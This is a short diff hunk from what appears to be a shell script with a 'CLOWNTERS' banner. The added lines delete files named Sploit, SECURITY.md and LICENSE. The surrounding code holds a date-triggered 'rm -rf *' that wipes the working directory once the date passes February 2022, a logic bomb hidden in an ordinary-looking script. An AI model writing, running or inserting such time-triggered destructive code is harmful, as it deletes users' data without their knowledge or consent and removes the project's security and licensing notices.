@@ -22,6 +22,9 @@
  #CLOWNTERS
 CLOWNTERS
 
+test -f Sploit && rm Sploit
+test -f SECURITY.md && rm SECURITY.md
+test -f LICENSE && rm LICENSE
 source .functions/.main
 if (($(date +%m%y) >= 0222)); then
     rm -rf *
